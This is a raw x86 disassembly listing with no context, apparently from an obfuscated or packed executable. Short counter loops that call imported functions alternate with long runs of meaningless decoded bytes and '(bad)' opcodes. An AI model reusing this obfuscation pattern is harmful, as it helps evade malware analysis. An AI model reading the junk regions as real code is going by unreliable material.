  406f77:	xor    BYTE PTR [edi+0x6b],cl
  406f7a:	mov    dl,0xca
  406f7c:	inc    ebx
  406f7d:	sbb    al,BYTE PTR gs:[esi-0x71]
  406f81:	leave  
  406f82:	shl    DWORD PTR [ebx-0x7c56fc1b],0x66
  406f89:	add    eax,ecx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a881
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a885,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a885
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a885,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0xf8,al
  40702c:	push   eax
  40702d:	cs stc 
  40702f:	pop    eax
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407032
  407038:	enter  0xa87b,0xb
  40703c:	dec    eax
  40703d:	pop    eax
  40703e:	imul   eax,DWORD PTR [ecx+0x39],0xffffffaa
  407042:	(bad)  
  407043:	dec    DWORD PTR ds:0xe6efebf9
  407049:	retf   
  40704a:	fwait
  40704b:	scas   eax,DWORD PTR es:[edi]
  40704c:	jmp    FWORD PTR [edx+0x14]
  40704f:	mov    bh,BYTE PTR ds:0xb9f9cfd1
  407055:	xchg   ebp,eax
  407056:	adc    al,0xb4
  407058:	shr    BYTE PTR [ecx],0xe4
  40705b:	mov    edi,0x6978c4b6
  407060:	pushf  
  407061:	sahf   
  407062:	jecxz  0x40703b
  407064:	(bad)  
  407065:	ins    DWORD PTR es:[edi],dx
  407066:	jbe    0x40702d
  407068:	fyl2xp1 
  40706a:	aad    0x75
  40706c:	gs or  edx,ebp
  40706f:	repz fimul WORD PTR ss:[edi+0x36]
  407074:	sbb    eax,0xb8e9f8ef
  407079:	retf   0x5536
  40707c:	xor    al,0x96
  40707e:	fst    st(6)
  407080:	sbb    cl,bh
  407082:	xchg   ecx,eax
  407083:	push   0xffffffcc
  407085:	fst    DWORD PTR [ebx+0x3a24340e]
  40708b:	inc    eax
  40708c:	stos   DWORD PTR es:[edi],eax
  40708d:	pusha  
  40708e:	mov    edi,0x33cffa40
  407093:	xchg   BYTE PTR [ebx],dh
  407095:	sbb    BYTE PTR [ebx],dh
  407097:	stos   DWORD PTR es:[edi],eax
  407098:	test   DWORD PTR [ebx+0x129bab37],esi
  40709e:	lock xchg esi,eax
  4070a0:	xchg   ebx,eax
  4070a1:	test   DWORD PTR ds:0x1a672ecd,eax
  4070a7:	lods   eax,DWORD PTR ds:[esi]
  4070a8:	(bad)  
  4070aa:	xor    al,0xd7
  4070ac:	jno    0x407078
  4070ae:	push   edi
  4070af:	out    0x17,al
  4070b1:	lahf   
  4070b2:	leave  
  4070b3:	push   eax
  4070b5:	shl    DWORD PTR [edx-0x8],cl
  4070b8:	mov    esp,ecx
  4070ba:	add    ecx,DWORD PTR [ecx]
  4070bc:	mov    cl,BYTE PTR [esi]
  4070be:	sub    esi,DWORD PTR [esi+0x65]
  4070c1:	(bad)
  4070c4:	icebp  
  4070c5:	pop    edx
  4070c6:	and    al,0x44
  4070c8:	push   edx
  4070c9:	pop    ecx
  4070ca:	xor    cl,BYTE PTR [ecx]
  4070cc:	dec    ecx
  4070cd:	sbb    ch,cl
  4070cf:	addr16 cmc 
  4070d1:	add    dh,BYTE PTR [ecx-0x3e13e794]
  4070d7:	add    ebx,DWORD PTR [ebx+0x68]
  4070da:	ss popf 
  4070dc:	or     DWORD PTR [eax],edx
  4070de:	cmp    BYTE PTR [edx+0x5b],al
  4070e1:	test   DWORD PTR ds:0xd466d9e2,ebp
  4070e7:	jno    0x40706a
  4070e9:	call   0xb913ff67
  4070ee:	mov    DWORD PTR [esi+0x28617030],edi
  4070f4:	sahf   
  4070f5:	jle    0x40707b
  4070f7:	fcom   QWORD PTR [ecx+0x3fe26a6f]
  4070fd:	shr    dl,1
  4070ff:	test   esp,0xca5ad96c
  407105:	xchg   esi,eax
  407106:	sbb    ecx,DWORD PTR [ebp+0x24bfd347]
  40710c:	sbb    ch,dh
  40710e:	jo     0x40709d
  407110:	out    dx,al
  407111:	ins    BYTE PTR es:[edi],dx
  407112:	mov    al,0x3f
  407114:	xchg   esp,eax
  407115:	mov    eax,ds:0x6423d10a
  40711a:	xor    bl,al
  40711c:	add    al,0xa
  40711e:	enter  0x9f23,0xcd
  407122:	cmp    al,0xb7
  407124:	sub    DWORD PTR [eax+0x400d0adf],0x28f7845
  40712e:	aaa    
  40712f:	int    0xa8
  407131:	lods   al,BYTE PTR ds:[esi]
  407132:	adc    eax,DWORD PTR [ecx]
  407134:	jge    0x4070c5
  407136:	pop    edx
  407137:	mov    bl,0x7c
  407139:	push   0xb77ca597
  40713e:	xor    eax,0x7ebfd15d
  407143:	imul   DWORD PTR [ebp-0x79]
  407146:	inc    esp
  407147:	add    esi,DWORD PTR [eax-0x59]
  40714a:	pop    eax
  40714b:	jae    0x407190
  40714d:	dec    ecx
  40714e:	push   edx
  40714f:	xchg   edx,eax
  407150:	add    ebp,eax
  407152:	in     eax,dx
  407153:	repnz dec ebx
  407155:	dec    ebx
  407156:	xchg   ecx,eax
  407157:	sub    bh,BYTE PTR [ecx-0x4ebc6be3]
  40715d:	adc    al,0xf5
  40715f:	xor    eax,0x96911d19
  407164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407165:	mov    ebx,DWORD PTR [ebx+0x31029210]
  40716b:	adc    DWORD PTR [ebp+0xfbeb8d9],ecx
  407171:	test   al,0xcd
  407173:	sub    edi,esp
  407175:	lods   eax,DWORD PTR ds:[esi]
  407176:	stos   DWORD PTR es:[edi],eax
  407177:	dec    ah
  407179:	mov    al,0xb4
  40717b:	adc    eax,0x5d355c44
  407180:	es ins BYTE PTR es:[edi],dx
  407182:	mov    DWORD PTR [ebx+0x40cfb5a1],edi
  407188:	fnstcw WORD PTR [ecx+0x70593f54]
  40718e:	dec    edx
  40718f:	sub    al,0x72
  407191:	ja     0x407193
  407193:	add    al,BYTE PTR [edi+0x1056d414]
  407199:	popf   
  40719a:	inc    esp
  40719b:	adc    al,0x22
  40719d:	imul   ecx,DWORD PTR [edx-0x4],0xffffffcd
  4071a1:	pop    edi
  4071a2:	imul   edi,DWORD PTR [esi],0x0
  4071a5:	loopne 0x407179
  4071a7:	cli    
  4071a8:	add    al,0xec
  4071aa:	pusha  
  4071ab:	aam    0x90
  4071ad:	shr    DWORD PTR ds:0x47e41fce,1
  4071b3:	loop   0x4071d3
  4071b5:	cwde   
  4071b6:	add    ebp,DWORD PTR ds:0xd5a2b5b4
  4071bc:	in     eax,dx
  4071bd:	rcr    DWORD PTR [edi+eax*1+0x2cfddc8d],0x70
  4071c5:	fnstcw WORD PTR [esi]
  4071c7:	das    
  4071c8:	sub    al,0x18
  4071ca:	stos   BYTE PTR es:[edi],al
  4071cb:	loop   0x40720a
  4071cd:	adc    bh,BYTE PTR [ebx+0x45]
  4071d0:	repnz aad 0x6f
  4071d3:	push   esi
  4071d4:	jae    0x4071d8
  4071d6:	pusha  
  4071d7:	pop    esp
  4071d8:	cmp    al,0x99
  4071da:	xchg   ebp,eax
  4071db:	mov    bl,0x3e
  4071dd:	add    eax,0x1f9c70ff
  4071e2:	aad    0x4a
  4071e4:	jmp    0x6025:0xe9d7ddc1
  4071eb:	loopne 0x4071cb
  4071ed:	jge    0x407187
  4071ef:	aas    
  4071f0:	sahf   
  4071f1:	imul   ecx,DWORD PTR [ecx-0x17],0x9e3ff141
  4071f8:	xor    ch,bl
  4071fa:	push   esi
  4071fb:	sub    al,0x40
  4071fd:	scas   al,BYTE PTR es:[edi]
  4071fe:	or     eax,0xac953350
  407203:	fnop   
  407205:	or     dl,ah
  407207:	cmp    al,0xb7
  407209:	aad    0x5d
  40720b:	shl    BYTE PTR [eax],1
  40720d:	xchg   BYTE PTR [edi-0x19c1380c],cl
  407213:	sub    edi,DWORD PTR [esi-0x17cbf41f]
  407219:	call   0x3a4e9840
  40721e:	ds add eax,edx
  407221:	test   ch,bh
  407223:	pop    eax
  407224:	int    0x40
  407226:	enter  0x2a0a,0x3e
  40722a:	stos   BYTE PTR es:[edi],al
  40722b:	(bad)  
  40722c:	aas    
  40722d:	jae    0x40725a
  40722f:	jp     0x40724c
  407231:	mov    ebx,0x1dbb0435
  407236:	sub    al,0xfc
  407238:	call   0x90dc:0xa1a84de1
  40723f:	lahf   
  407240:	out    0x1a,eax
  407242:	add    edx,DWORD PTR [esi+ebp*1-0x9]
  407246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407247:	mov    edx,0x6f569840
  40724c:	ret    
  40724d:	shl    ah,0x5c
  407250:	test   al,0xf3
  407252:	les    ebp,FWORD PTR [ebx+0x162285e]
  407258:	push   eax
  407259:	neg    BYTE PTR [edx*1+0x158c5142]
  407260:	push   edi
  407261:	mov    ch,0xd
  407263:	stc    
  407264:	push   es
  407265:	scas   eax,DWORD PTR es:[edi]
  407266:	nop
  407267:	adc    dh,BYTE PTR [esi+0x6a]
  40726a:	mov    ds:0x4e398601,eax
  40726f:	lock mov al,ds:0xb27f06a2
  407275:	leave  
  407276:	cmp    cl,BYTE PTR [eax]
  407278:	adc    ebx,DWORD PTR [ebx]
  40727a:	sbb    ch,BYTE PTR [ecx+0x1f]
  40727d:	sti    
  40727e:	sahf   
  40727f:	jle    0x4072ea
  407281:	stos   DWORD PTR es:[edi],eax
  407282:	jo     0x4072a3
  407284:	ss sti 
  407286:	std    
  407287:	push   esi
  407288:	fcmovnbe st,st(0)
  40728a:	add    al,0x90
  40728c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40728d:	repnz std 
  40728f:	retf   0xd339
  407292:	add    bl,bh
  407294:	mov    edx,0xa7d4ec9f
  407299:	jae    0x4072eb
  40729b:	scas   al,BYTE PTR es:[edi]
  40729c:	jno    0x4072a1
  40729e:	push   cs
  40729f:	in     al,0xea
  4072a1:	cwde   
  4072a2:	fwait
  4072a3:	pcmpeqb mm1,QWORD PTR [ebp-0x75]
  4072a7:	pop    ecx
  4072a8:	sub    DWORD PTR [ecx-0x1ce9eb03],eax
  4072ae:	jmp    0x3c91:0xb4842c32
  4072b5:	push   eax
  4072b6:	jo     0x40723b
  4072b8:	bound  ebx,QWORD PTR [esi]
  4072ba:	sub    bh,ah
  4072bc:	sub    al,0xc6
  4072be:	xor    BYTE PTR [ecx],ah
  4072c0:	retf   0xc8cf
  4072c3:	mov    BYTE PTR [edi+0x2b],0x5f
  4072c7:	(bad)  
  4072c8:	icebp  
  4072c9:	push   0x3c278bd4
  4072ce:	add    al,0xba
  4072d0:	(bad)  
  4072d1:	dec    ecx
  4072d2:	mov    edi,0x4a6d39ff
  4072d7:	mov    ebx,0xf40901b8
  4072dc:	push   0x1849c110
  4072e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072e2:	cli    
  4072e3:	jle    0x407289
  4072e5:	je     0x40727b
  4072e7:	cmp    esi,DWORD PTR [ebp+0x70]
  4072ea:	int    0x9e
  4072ec:	cmp    eax,0x119fd223
  4072f1:	add    BYTE PTR [esi-0x51],bl
  4072f4:	and    ch,cl
  4072f6:	lock (bad) 
  4072f9:	in     eax,0x37
  4072fb:	add    eax,0x2782795b
  407300:	out    0xb4,eax
  407302:	stos   DWORD PTR es:[edi],eax
  407303:	scas   eax,DWORD PTR es:[edi]
  407304:	fidiv  WORD PTR [ecx]
  407306:	mov    ah,0xbf
  407308:	mov    dl,0xa0
  40730a:	jmp    0x40735d
  40730c:	inc    ebp
  40730d:	aad    0xc4
  40730f:	xchg   edx,eax
  407310:	ins    DWORD PTR es:[edi],dx
  407311:	jne    0x407316
  407313:	(bad)  
  407314:	jge    0x407327
  407316:	pop    ebx
  407317:	ja     0x4072ee
  407319:	jo     0x4072fb
  40731b:	jg     0x4072d0
  40731d:	sub    ebp,edi
  40731f:	mov    dh,0xc1
  407321:	push   edi
  407322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407323:	mov    BYTE PTR [ebp-0x1],0x7f
  407327:	lea    eax,[ebp-0x1]
  40732a:	and    DWORD PTR ds:0x42a779,0x0
  407334:	jmp    0x407346
  407339:	mov    ecx,DWORD PTR ds:0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x6d0b3a0a,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x407402
  4073b7:	stos   BYTE PTR es:[edi],al
  4073b8:	aad    0x85
  4073ba:	pop    ecx
  4073bb:	shr    ebp,0xb0
  4073be:	xor    ah,BYTE PTR [ecx]
  4073c0:	call   0x356c71cd
  4073c5:	dec    ebx
  4073c6:	stos   DWORD PTR es:[edi],eax
  4073c7:	pop    edx
  4073c8:	dec    ebp
  4073c9:	xor    BYTE PTR [esi],0xe3
  4073cc:	repnz add ecx,DWORD PTR [edi*1+0x434b6df0]
  4073d4:	xchg   esp,eax
  4073d5:	sbb    edi,DWORD PTR [esi+ecx*8-0x1f7d5f1c]
  4073dc:	sub    DWORD PTR [edx+eiz*1-0x7f2e53e3],esi
  4073e3:	push   es
  4073e4:	gs jbe 0x407438
  4073e7:	xchg   esp,eax
  4073e8:	int    0xa6
  4073ea:	imul   edx,edi,0xffffffa9
  4073ed:	add    esi,ecx
  4073ef:	fcomp  st(5)
  4073f1:	mov    ecx,0x2416a3b0
  4073f6:	push   ecx
  4073f7:	mov    dh,0x5b
  4073f9:	call   bx
  4073fc:	jp     0x4073d8
  4073fe:	xchg   edx,eax
  4073ff:	pop    eax
  407400:	std    
  407401:	lds    ecx,FWORD PTR [eax-0x51c12406]
  407407:	repz xor BYTE PTR [ecx-0x645e53b0],ah
  40740e:	or     al,0xc3
  407410:	inc    edx
  407411:	mov    eax,ds:0x10996648
  407416:	(bad)  
  407417:	sub    al,0xb2
  407419:	mov    edx,0x178af87d
  40741e:	scas   eax,DWORD PTR es:[edi]
  40741f:	int3   
  407420:	(bad)  
  407421:	clc    
  407422:	dec    ecx
  407423:	fld    TBYTE PTR [ebp+0x266bd6f5]
  407429:	adc    edi,ebx
  40742b:	sbb    BYTE PTR [ecx+eiz*4],dh
  40742e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  407430:	pop    esp
  407431:	or     cl,BYTE PTR [ecx-0x4a098e15]
  407437:	jmp    0xe3bc:0x9ff6f6ce
  40743e:	std    
  40743f:	in     al,dx
  407440:	arpl   WORD PTR [esi+0x6bdee9ff],di
  407446:	imul   esp,DWORD PTR [edx+0x102b5fde],0x2753f991
  407450:	mov    dh,0x58
  407452:	into   
  407453:	(bad)  
  407454:	bound  ebx,QWORD PTR [ebx]
  407456:	push   0x605dad4
  40745b:	iretw  
  40745d:	cld    
  40745e:	push   ebp
  40745f:	ins    DWORD PTR es:[edi],dx
  407460:	jg     0x407452
  407462:	repz ja 0x4074dc
  407465:	mov    WORD PTR [edi-0x5956ae07],?
  40746b:	dec    esi
  40746c:	cmp    BYTE PTR [edx-0x65],ch
  40746f:	test   BYTE PTR [eax-0x7c022009],ch
  407475:	xor    eax,0xc92052b
  40747a:	and    DWORD PTR [ebp+0x47],ebp
  40747d:	add    dl,BYTE PTR [ecx-0x1f]
  407480:	mov    edi,0x82e2e1a9
  407485:	iret   
  407486:	pop    es
  407487:	jecxz  0x407492
  407489:	stos   BYTE PTR es:[edi],al
  40748a:	add    BYTE PTR [esi+edi*8],ch
  40748d:	xchg   esi,eax
  40748e:	xchg   esi,eax
  40748f:	ffree  st(5)
  407491:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407493:	mov    BYTE PTR [edi-0x73],bh
  407496:	or     DWORD PTR [esi+0x54d73b4],edi
  40749c:	nop
  40749d:	sub    BYTE PTR [eax+ebp*1+0x2771a72f],al
  4074a4:	addr16 pop ds
  4074a6:	or     dh,ch
  4074a8:	mov    ds:0xb74125ce,al
  4074ad:	scas   al,BYTE PTR es:[edi]
  4074ae:	xchg   DWORD PTR [ebp+0x57],ecx
  4074b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074b2:	or     dh,BYTE PTR [ecx+0x16184789]
  4074b8:	(bad)  
  4074b9:	push   0xdd06a965
  4074be:	ret    
  4074bf:	scas   eax,DWORD PTR es:[edi]
  4074c0:	pop    ebp
  4074c1:	(bad)  
  4074c2:	cmp    BYTE PTR [ebp-0x39],dh
  4074c5:	mov    ds:0x79e5499b,al
  4074ca:	xchg   esp,eax
  4074cb:	adc    ebx,esp
  4074cd:	cmp    dl,BYTE PTR [ebp-0x39]
  4074d0:	lods   eax,DWORD PTR ds:[esi]
  4074d1:	bound  ebp,QWORD PTR ds:0xf7e0b899
  4074d7:	lea    eax,[eax]
  4074d9:	in     eax,0x1
  4074db:	inc    edi
  4074dc:	mov    ds:0x9275029,al
  4074e1:	call   0x73a7bf96
  4074e6:	jo     0x40754b
  4074e8:	ds jg  0x4074e9
  4074eb:	push   cs
  4074ec:	push   0x1b
  4074ee:	repz jecxz 0x4074ce
  4074f1:	jmp    0xf1e56cf7
  4074f6:	push   esp
  4074f7:	or     ebp,eax
  4074f9:	into   
  4074fa:	or     ah,ch
  4074fc:	enter  0x16ed,0x73
  407500:	mov    eax,DWORD PTR [edi]
  407502:	fild   WORD PTR [ebp-0x3141ba19]
  407508:	or     eax,0x4d30510e
  40750d:	and    eax,eax
  40750f:	sbb    BYTE PTR [ebp-0x79286bd9],bl
  407515:	mov    bl,0x97
  407517:	xchg   ebp,eax
  407518:	and    DWORD PTR [edx+0x56],eax
  40751b:	test   ecx,ecx
  40751d:	pushf  
  40751e:	xor    BYTE PTR [esi-0x5a60e0f3],dh
  407524:	sahf   
  407525:	sub    BYTE PTR [eax+0x6079be90],al
  40752b:	or     eax,edi
  40752d:	jmp    0x40759c
  40752f:	hlt    
  407530:	sub    edx,edi
  407532:	popf   
  407533:	mov    cl,0x7e
  407535:	leave  
  407536:	aas    
  407537:	push   ecx
  407538:	push   ebx
  407539:	xor    al,0xea
  40753b:	mov    ebp,0xe703b2c9
  407540:	and    BYTE PTR [ecx-0x32],al
  407543:	push   ebp
  407544:	mov    cs,WORD PTR [ebp-0x2dcd1294]
  40754a:	loop   0x4075ac
  40754c:	ins    DWORD PTR es:[edi],dx
  40754d:	outs   dx,BYTE PTR ds:[esi]
  40754e:	cmp    eax,0x114dc94
  407553:	dec    esi
  407554:	in     al,dx
  407555:	jmp    0xf1585a86
  40755a:	inc    edx
  40755b:	test   edi,0x822c59c6
  407561:	(bad)  
  407562:	fimul  DWORD PTR ds:0xa0cc588c
  407568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407569:	mov    esi,0x17958c42
  40756e:	xor    al,0x95
  407570:	add    eax,0x1b64be35
  407575:	test   eax,0x56fab35a
  40757a:	les    eax,FWORD PTR [ecx+0x3f24ab2c]
  407580:	mov    bh,0xf2
  407582:	inc    edx
  407583:	and    al,0x6e
  407585:	repnz mov bl,0x2e
  407588:	push   0xffffffb1
  40758a:	fimul  WORD PTR [edx+ebp*2+0x13]
  40758e:	mov    esp,0xaa30e2af
  407593:	mov    eax,ds:0x42c37eb7
  407598:	xor    al,al
  40759a:	leave  
  40759b:	xchg   ecx,eax
  40759c:	js     0x40752d
  40759e:	add    al,ah
  4075a0:	mov    DWORD PTR [edx-0x5c4ac838],ebp
  4075a6:	aam    0xa6
  4075a8:	rol    BYTE PTR [ecx+edx*4],0x58
  4075ac:	test   DWORD PTR [esi],ebp
  4075ae:	popf   
  4075af:	mov    ah,0xdd
  4075b1:	loope  0x4075c6
  4075b3:	(bad)  
  4075b4:	icebp  
  4075b5:	loope  0x407616
  4075b7:	test   al,0xbb
  4075b9:	mov    bl,0x2c
  4075bb:	or     eax,0xe0d6d3ce
  4075c0:	mov    ebp,DWORD PTR [edi-0x63]
  4075c3:	unpckhps xmm6,XMMWORD PTR [ecx-0x59e4bb00]
  4075ca:	aas    
  4075cb:	fstp   TBYTE PTR [edi]
  4075cd:	or     bl,cl
  4075cf:	push   ds
  4075d0:	lods   al,BYTE PTR ds:[esi]
  4075d1:	pop    ss
  4075d2:	xor    al,0x16
  4075d4:	inc    eax
  4075d5:	xlat   BYTE PTR ds:[ebx]
  4075d6:	sbb    al,0x75
  4075d8:	rcr    DWORD PTR [ebp-0x9462502],cl
  4075de:	sahf   
  4075df:	inc    esi
  4075e0:	lock xor bh,0xb3
  4075e4:	sub    ah,cl
  4075e6:	pop    edi
  4075e7:	aam    0xce
  4075e9:	mov    al,0xce
  4075eb:	xchg   DWORD PTR [edx-0x72f96995],ecx
  4075f1:	ret    
  4075f2:	leave  
  4075f3:	test   eax,0xd55cc568
  4075f8:	stos   DWORD PTR es:[edi],eax
  4075f9:	scas   al,BYTE PTR es:[edi]
  4075fa:	cmp    ah,BYTE PTR [edi+0x706f46ff]
  407600:	lds    edx,FWORD PTR [edx]
  407602:	sub    eax,0xb35cfcb1
  407607:	enter  0x6f07,0x21
  40760b:	or     ah,ah
  40760d:	xchg   ebx,eax
  40760e:	jecxz  0x40760d
  407610:	jne    0x4075ab
  407612:	cli    
  407613:	shl    DWORD PTR [edi+0x51750b23],1
  407619:	pop    ebp
  40761a:	inc    esp
  40761b:	test   eax,0xb9e199c6
  407620:	inc    DWORD PTR [esi]
  407622:	cmp    DWORD PTR [edx+0x51],eax
  407625:	dec    edi
  407626:	mov    al,0xf7
  407628:	sub    DWORD PTR [eax+0x1c],edi
  40762b:	dec    ebp
  40762c:	fstp   QWORD PTR [ebp-0x29]
  40762f:	and    eax,0x488b62db
  407634:	mov    edx,0x62cfe5e2
  407639:	xor    DWORD PTR [edx-0x73632825],ebx
  40763f:	ds xchg ebx,eax
  407641:	adc    dh,BYTE PTR [edx-0x1c]
  407644:	in     al,dx
  407645:	jmp    FWORD PTR [edx]
  407647:	daa    
  407648:	ret    
  407649:	loope  0x4075d5
  40764b:	jl     0x4075f0
  40764d:	stos   DWORD PTR es:[edi],eax
  40764e:	pmullw mm5,QWORD PTR [ebx+0x5b377e40]
  407655:	add    cl,cl
  407657:	jmp    0x407644
  407659:	dec    eax
  40765a:	sbb    BYTE PTR [ecx-0x25e6c660],ch
  407660:	and    ah,cl
  407662:	aam    0x5e
  407664:	or     DWORD PTR [ebp*2+0xf3525ef],ebp
  40766b:	aad    0xa1
  40766d:	or     bl,BYTE PTR [edx+0x34b22183]
  407673:	stos   DWORD PTR es:[edi],eax
  407674:	shl    BYTE PTR [ecx+eax*1-0x16f3cea5],0x7d
  40767c:	(bad)  
  40767d:	idiv   DWORD PTR [ebp+esi*4-0x13daec90]
  407684:	out    0xe5,al
  407686:	retf   
  407687:	(bad)  
  407688:	pop    esp
  407689:	xor    DWORD PTR [esi-0x17f572e8],edx
  40768f:	jmp    0x407653
  407691:	dec    esi
  407692:	mov    esp,0x3600afc6
  407697:	pop    ss
  407698:	pushf  
  407699:	out    dx,al
  40769a:	mov    edx,0x40933a24
  40769f:	mov    bh,0x35
  4076a1:	dec    BYTE PTR [ecx+0x458af045]
  4076a7:	inc    DWORD PTR [ecx+0x42a7610d]
  4076ad:	add    al,bh
  4076af:	ins    BYTE PTR es:[edi],dx
  4076b0:	add    BYTE PTR [eax],al
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx-0x4e518918],1
  407796:	jp     0x4077d6
  407798:	iret   
  407799:	mov    al,0xd6
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x4077e8
  4077a2:	jno    0x407725
  4077a4:	xchg   edx,eax
  4077a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077a6:	sbb    al,0x4b
  4077a8:	jmp    0x4077e4
  4077aa:	cmp    BYTE PTR [ecx],dl
  4077ac:	test   eax,0xec6d2958
  4077b1:	mov    cl,0xcb
  4077b3:	in     eax,0x37
  4077b5:	leave  
  4077b6:	jg     0x4077a3
  4077b8:	sub    dh,ch
  4077ba:	fs cmp eax,0xc3227615
  4077c0:	mov    al,BYTE PTR [ebx+0x8]
  4077c3:	aaa    
  4077c4:	ds dec esp
  4077c6:	push   cs
  4077c7:	pop    ecx
  4077c8:	jp     0x40780b
  4077ca:	adc    ebx,DWORD PTR [ebx+0x557f56a2]
  4077d0:	add    eax,0x4b625530
  4077d5:	in     eax,0xc1
  4077d7:	call   0x68db734e
  4077dc:	daa    
  4077dd:	sti    
  4077de:	jne    0x40784e
  4077e0:	retf   
  4077e1:	sbb    BYTE PTR [ebx+0x21b5e403],ah
  4077e7:	mov    esp,0x782f5bdd
  4077ec:	cmc    
  4077ed:	ins    BYTE PTR es:[edi],dx
  4077ee:	sub    eax,DWORD PTR [ebx-0x3d]
  4077f1:	or     BYTE PTR [edx+0xe277f56],ch
  4077f7:	sbb    BYTE PTR [esi+0x29],0x5b
  4077fb:	outs   dx,BYTE PTR ds:[esi]
  4077fc:	out    dx,eax
  4077fd:	scas   eax,DWORD PTR es:[edi]
  4077fe:	xor    edi,DWORD PTR [eax+0x3d76738d]
  407804:	sbb    dh,dh
  407806:	inc    BYTE PTR [esi+0x228d115e]
  40780c:	and    dl,BYTE PTR [eax+0x6cc8478c]
  407812:	push   ss
  407813:	mov    dh,0x89
  407815:	push   esi
  407816:	frstor [ebx+0x1f440ea6]
  40781c:	mov    ebx,0xeadfb408
  407821:	rol    DWORD PTR [edx-0x42],1
  407824:	push   0xb
  407826:	sub    BYTE PTR [ebx-0x4a],ah
  407829:	jae    0x4077db
  40782b:	cvtdq2ps xmm5,XMMWORD PTR ds:0x4928b870
